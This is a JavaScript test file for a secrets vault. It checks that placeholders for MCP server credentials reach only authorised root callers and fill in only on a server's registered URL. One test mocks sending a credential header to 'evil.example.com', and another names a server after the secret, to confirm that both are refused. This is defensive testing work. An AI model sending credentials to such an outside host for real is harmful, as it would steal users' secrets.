import assert from 'node:assert/strict';
import { after, test } from 'node:test';
import { browser, openPopup, press, typeInto } from './browser.mjs';
import { setup } from './setup.mjs';

const { chrome, embedder } = await setup();
const cdp = await browser(chrome);
after(() => cdp.close());

const VALUE = 'fake-settings-mcp-0701';
const ROOT = { pid: 5, ppid: 1, uid: 0, gid: 0, tag: null, users: 'enforce', groups: [0] };
const REPORT = { ...ROOT, users: 'report' };
const UNSTAMPED = { pid: 5, ppid: 1, uid: 0, gid: 0, tag: null };
const CONE = { pid: 7, ppid: 1, uid: 1000, gid: 1000, tag: 'cone', users: 'enforce' };
const SUDOER = { ...CONE, groups: [1000, 27] };
const noRecord = (name) => ({
  v: 1,
  error: { code: 'ENOENT', message: `no record named ${name}` },
});
const noToken = (server) => ({
  v: 1,
  state: 'done',
  exit: 3,
  message: `no token for mcp:${server} in seven's vault: run jerk mcp:${server} create`,
});

async function connected(t) {
  const page = await embedder(t);
  await page.evaluate(() => window.harness.connect());
  return page;
}

const sealed = (page, req, stamp) =>
  page.evaluate((r, s) => window.harness.sealed({ v: 1, ...r }, s), req, stamp);
const call = (page, op, fields) => page.evaluate((o, f) => window.harness.call(o, f), op, fields);

const settings = (page, name = 'DOCS_MCP', server = 'docs') =>
  call(page, 'put', { name, value: VALUE, kind: 'mcp', server });

async function jerkStatus(page, server, stamp, reader = stamp, answer = { exit: 0 }) {
  const provider = `mcp:${server}`;
  const asked = await sealed(page, { op: 'request', kind: 'jerk', jop: 'status', provider }, stamp);
  await call(page, 'answer', { request: asked.id, state: 'done', ...answer });
  return sealed(page, { op: 'status', id: asked.id }, reader);
}

test('root gets the placeholder of a Settings mcp record by name and server', async (t) => {
  const page = await connected(t);
  const put = await settings(page);
  const got = await sealed(page, { op: 'placeholder', name: 'DOCS_MCP', server: 'docs' }, ROOT);
  assert.deepEqual(got, { v: 1, placeholder: put.placeholder, state: 'inert' });
});

test('NEGATIVE a cone in the sudo group gets the answer for no record', async (t) => {
  const page = await connected(t);
  await settings(page);
  const got = await sealed(page, { op: 'placeholder', name: 'DOCS_MCP', server: 'docs' }, SUDOER);
  assert.deepEqual(got, noRecord('DOCS_MCP'));
});

test('NEGATIVE uid 0 without users enforce gets the answer for no record', async (t) => {
  const page = await connected(t);
  await settings(page);
  for (const stamp of [REPORT, UNSTAMPED]) {
    const got = await sealed(page, { op: 'placeholder', name: 'DOCS_MCP', server: 'docs' }, stamp);
    assert.deepEqual(got, noRecord('DOCS_MCP'));
  }
});

test('NEGATIVE root naming the wrong server, or none, gets the answer for no record', async (t) => {
  const page = await connected(t);
  await settings(page);
  for (const server of ['other', undefined, 7]) {
    const got = await sealed(page, { op: 'placeholder', name: 'DOCS_MCP', server }, ROOT);
    assert.deepEqual(got, noRecord('DOCS_MCP'));
  }
});

test('NEGATIVE root gets nothing for an mcp record bound to no server', async (t) => {
  const page = await connected(t);
  await call(page, 'put', { name: 'LOOSE_MCP', value: VALUE, kind: 'mcp' });
  const got = await sealed(page, { op: 'placeholder', name: 'LOOSE_MCP' }, ROOT);
  assert.deepEqual(got, noRecord('LOOSE_MCP'));
});

test('NEGATIVE root gets nothing for a removed mcp record', async (t) => {
  const page = await connected(t);
  await settings(page);
  await call(page, 'remove', { name: 'DOCS_MCP', kind: 'mcp' });
  const got = await sealed(page, { op: 'placeholder', name: 'DOCS_MCP', server: 'docs' }, ROOT);
  assert.deepEqual(got, noRecord('DOCS_MCP'));
});

test('NEGATIVE a secret-only name keeps its answer, with a server or without', async (t) => {
  const page = await connected(t);
  const put = await call(page, 'put', { name: 'PLAIN_KEY', value: VALUE });
  const today = { v: 1, placeholder: put.placeholder, state: 'inert' };
  for (const stamp of [ROOT, SUDOER]) {
    const got = await sealed(page, { op: 'placeholder', name: 'PLAIN_KEY', server: 'docs' }, stamp);
    assert.deepEqual(got, today);
  }
});

test('a name held by a secret and an mcp record answers by the caller and the server', async (t) => {
  const page = await connected(t);
  const secret = await call(page, 'put', { name: 'SHARED_NAME', value: VALUE });
  const mcp = await settings(page, 'SHARED_NAME');
  const name = 'SHARED_NAME';
  const asRoot = await sealed(page, { op: 'placeholder', name, server: 'docs' }, ROOT);
  assert.equal(asRoot.placeholder, mcp.placeholder);
  const plain = await sealed(page, { op: 'placeholder', name }, ROOT);
  assert.equal(plain.placeholder, secret.placeholder);
  const asCone = await sealed(page, { op: 'placeholder', name, server: 'docs' }, SUDOER);
  assert.equal(asCone.placeholder, secret.placeholder);
});

test('NEGATIVE the sealed list still shows only secrets, to root too', async (t) => {
  const page = await connected(t);
  await settings(page);
  assert.deepEqual(await sealed(page, { op: 'list' }, ROOT), { v: 1, secrets: [] });
});

test('root gets the placeholder and record through a jerk status bios answered exit 0', async (t) => {
  const page = await connected(t);
  const put = await settings(page);
  assert.deepEqual(await jerkStatus(page, 'docs', ROOT), {
    v: 1,
    state: 'done',
    exit: 0,
    placeholder: put.placeholder,
    record: 'inert',
  });
});

test('NEGATIVE a non-root jerk status is byte-identical to one for a server with no record', async (t) => {
  const page = await connected(t);
  await settings(page);
  const none = await jerkStatus(page, 'docs', SUDOER, SUDOER, {
    exit: 3,
    message: noToken('docs').message,
  });
  const got = await jerkStatus(page, 'docs', SUDOER);
  assert.equal(JSON.stringify(got), JSON.stringify(none));
  assert.equal(JSON.stringify(got), JSON.stringify(noToken('docs')));
});

test("NEGATIVE uid 0 under report gets exit 3 for a jerk status, its own or root's", async (t) => {
  const page = await connected(t);
  await settings(page);
  assert.deepEqual(await jerkStatus(page, 'docs', REPORT), noToken('docs'));
  assert.deepEqual(await jerkStatus(page, 'docs', ROOT, REPORT), noToken('docs'));
});

test("NEGATIVE root reading a cone's jerk status gets exit 3", async (t) => {
  const page = await connected(t);
  await settings(page);
  assert.deepEqual(await jerkStatus(page, 'docs', SUDOER, ROOT), noToken('docs'));
});

test('NEGATIVE a removed record gives root and a cone exit 3, so a removal race reveals nothing', async (t) => {
  const page = await connected(t);
  await settings(page);
  await call(page, 'remove', { name: 'DOCS_MCP', kind: 'mcp' });
  assert.deepEqual(await jerkStatus(page, 'docs', ROOT), noToken('docs'));
  assert.deepEqual(await jerkStatus(page, 'docs', SUDOER), noToken('docs'));
});

test('NEGATIVE a jerk status with no mcp record keeps its answer', async (t) => {
  const page = await connected(t);
  await settings(page);
  assert.deepEqual(await jerkStatus(page, 'other', ROOT), {
    v: 1,
    state: 'done',
    exit: 0,
  });
});

test('NEGATIVE root gets no placeholder when bios answered a nonzero exit', async (t) => {
  const page = await connected(t);
  await settings(page);
  const answer = { exit: 3, message: 'not usable' };
  assert.deepEqual(await jerkStatus(page, 'docs', ROOT, ROOT, answer), {
    v: 1,
    state: 'done',
    exit: 3,
    message: 'not usable',
  });
});

test('NEGATIVE a jerk status of a provider outside mcp is left alone', async (t) => {
  const page = await connected(t);
  await settings(page, 'GITHUB_MCP', 'github');
  const asked = await sealed(
    page,
    { op: 'request', kind: 'jerk', jop: 'status', provider: 'github' },
    SUDOER
  );
  await call(page, 'answer', { request: asked.id, state: 'done', exit: 0 });
  const got = await sealed(page, { op: 'status', id: asked.id }, SUDOER);
  assert.deepEqual(got, { v: 1, state: 'done', exit: 0 });
});

test('several live mcp records on one server are EINVAL for root and exit 3 for a cone', async (t) => {
  const page = await connected(t);
  await settings(page, 'DOCS_MCP');
  await settings(page, 'DOCS_TWO_MCP');
  assert.deepEqual(await jerkStatus(page, 'docs', ROOT), {
    v: 1,
    error: {
      code: 'EINVAL',
      message: 'several mcp records are bound to docs; ask for one by name',
    },
  });
  assert.deepEqual(await jerkStatus(page, 'docs', SUDOER), noToken('docs'));
  const byName = await sealed(page, { op: 'placeholder', name: 'DOCS_MCP', server: 'docs' }, ROOT);
  assert.ok(byName.placeholder);
});

test("a secret record of the provider keeps today's reply for a jerk status", async (t) => {
  const page = await connected(t);
  await settings(page);
  const oauth = await call(page, 'seal', {
    name: 'DOCS_TOKEN',
    value: VALUE,
    source: 'oauth:mcp:docs',
  });
  assert.deepEqual(await jerkStatus(page, 'docs', SUDOER), {
    v: 1,
    state: 'done',
    exit: 0,
    placeholder: oauth.placeholder,
  });
});

test('list.mcp holds only usable records bound to a server, without a placeholder or source', async (t) => {
  const page = await connected(t);
  await settings(page, 'READY_MCP');
  await call(page, 'put', { name: 'LOOSE_MCP', value: 'fake-loose-mcp-0702', kind: 'mcp' });
  await settings(page, 'GONE_MCP');
  await call(page, 'remove', { name: 'GONE_MCP', kind: 'mcp' });
  const expired = { kind: 'mcp', server: 'docs', source: 'oauth:mcp', expiresAt: Date.now() - 1 };
  await call(page, 'seal', { ...expired, name: 'STALE_MCP', value: 'fake-stale-mcp-0703' });
  await call(page, 'seal', {
    name: 'DOCS_GRANT',
    value: 'fake-grant-mcp-0704',
    kind: 'grant',
    source: 'oauth:mcp',
    oauth: { tokenUrl: 'https://docs.example.com/token', clientId: 'fake-client' },
  });
  await call(page, 'seal', {
    ...expired,
    name: 'RENEWS_MCP',
    value: 'fake-renews-mcp-0705',
    refresh: 'DOCS_GRANT',
  });
  await call(page, 'put', {
    name: 'ECHOED_MCP',
    value: 'fake-echoed-mcp-0706',
    kind: 'mcp',
    server: `leak-${VALUE}`,
  });
  const { list } = await call(page, 'list');
  assert.deepEqual(list.mcp, [
    { name: 'READY_MCP', server: 'docs', state: 'ready' },
    { name: 'RENEWS_MCP', server: 'docs', state: 'refreshing' },
  ]);
});

test('list.mcp is empty while the vault is locked before its first unlock', async (t) => {
  const page = await connected(t);
  await settings(page);
  const manage = await openPopup(cdp, page, { kind: 'protect' }, 'Vault lock');
  await press(manage, 'Protect with a passphrase');
  await typeInto(manage, '#passphrase', 'correct horse battery');
  await typeInto(manage, '#confirm', 'correct horse battery');
  await press(manage, 'Protect');
  await manage.until(() => document.body.textContent.includes('Protected with a passphrase.'));
  await press(manage, 'Lock now');
  await page.until(async () => (await window.harness.call('status')).status.locked === true);
  await embedder(t, 'seven', page);
  const welcome = await page.evaluate(() => window.harness.connect());
  assert.equal(welcome.status.locked, true);
  assert.deepEqual((await call(page, 'list')).list.mcp, []);
});

test("root's placeholder is filled only on the server's registered URL, and the read is not audited", async (t) => {
  const page = await connected(t);
  const VALUE_HEAD = `Bearer ${VALUE}`;
  await settings(page);
  await call(page, 'endpoints', {
    mcp: [{ server: 'docs', url: 'https://docs.example.com/mcp', names: ['DOCS_MCP'] }],
  });
  const before = (await call(page, 'audit', {})).audit.length;
  const { placeholder } = await sealed(
    page,
    { op: 'placeholder', name: 'DOCS_MCP', server: 'docs' },
    ROOT
  );
  assert.equal((await call(page, 'audit', {})).audit.length, before);
  const send = (url) =>
    page.evaluate((f) => window.harness.forward(f), {
      head: { method: 'POST', url, headers: [['Authorization', `Bearer ${placeholder}`]] },
      body: '{}',
      owner: ROOT,
      exit: 'page',
      rawTraits: {},
    });
  const sent = await send('https://docs.example.com/mcp/call');
  assert.deepEqual(sent.reply.head.headers, [['Authorization', VALUE_HEAD]]);
  const stolen = await send('https://evil.example.com/mcp');
  assert.ok(stolen.reply.refused);
  assert.ok(!JSON.stringify(stolen).includes(VALUE));
});
